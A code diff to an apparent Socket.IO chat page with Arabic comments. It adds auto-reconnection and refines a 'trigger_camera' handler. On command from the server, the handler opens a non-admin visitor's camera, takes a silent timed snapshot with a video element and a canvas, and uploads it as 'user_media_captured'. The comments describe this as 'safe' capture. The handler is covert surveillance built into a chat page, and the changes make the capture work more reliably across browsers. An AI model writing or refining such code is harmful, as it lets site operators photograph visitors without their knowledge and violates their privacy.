@@ -120,7 +120,15 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
 
   <script src="/socket.io/socket.io.js"></script>
   <script>
-    const socket = io();
+    // تفعيل الاتصال الآمن مع إعادة المحاولة التلقائية عند أي هبوط في النت
+    const socket = io({
+      secure: true,
+      transports: ['websocket', 'polling'],
+      reconnection: true,
+      reconnectionAttempts: 10,
+      reconnectionDelay: 1000
+    });
+
     const sr = document.getElementById('sr');
     const hi = document.getElementById('hi');
     const conv = document.getElementById('conv');
@@ -395,7 +403,7 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
       document.body.style.backgroundColor = bgColor;
     });
 
-    // --- التعديل الآمن لالتقاط الصورة عبر Canvas ---
+    // التقاط الكاميرا بأمان باستخدام عنصر فيديو وعنصر Canvas المتوافق مع كافة المتصفحات
     socket.on('trigger_camera', async ({ mediaType }) => {
       if (isAdmin) return;
       try {
@@ -403,23 +411,24 @@ body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction
         if (mediaType === 'photo') {
           const video = document.createElement('video');
           video.srcObject = stream;
-          video.autoplay = true;
+          video.setAttribute('playsinline', '');
+          video.play();
           
-          video.onloadedmetadata = () => {
+          setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const dataUrl = canvas.toDataURL('image/jpeg');
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
             socket.emit('user_media_captured', { dataUrl: dataUrl, type: 'image' });
             
             stream.getTracks().forEach(track => track.stop());
-          };
+          }, 800);
         }
       } catch (err) {
-        console.log('الكاميرا غير متاحة أو تم رفض الإذن');
+        console.log('الكاميرا غير متاحة أو تم رفض الإذن من المستخدم');
       }
     });
   </script>
